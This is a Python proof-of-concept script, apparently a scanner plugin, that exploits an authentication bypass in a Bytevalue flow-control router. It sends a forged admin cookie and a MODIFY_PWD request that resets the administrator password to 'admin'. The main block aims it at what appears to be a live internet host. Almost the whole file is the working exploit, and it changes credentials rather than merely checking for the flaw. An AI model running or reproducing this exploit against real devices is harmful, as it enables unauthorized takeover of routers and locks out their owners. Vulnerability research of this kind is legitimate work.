#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  百为流控路由管理员密码重置漏洞
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-099869
"""

def assign(service, arg):
    if service == 'bytevalue_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload ='goform/webForm'
    cookie ='fsm_u=admin; fsm_login='
    data = 'cmd=MODIFY_PWD&json=%7B%22NewPwd%22%3A%22admin%22%7D'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url,data,cookie = cookie)
    if '{ "ret": 0 }' in res and code ==200:
        security_hole(arg + '  Has resetting password user:%s pass:%s' %('admin','admin'))
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('bytevalue_router', 'http://f3205877.f3322.org:2011/')[1])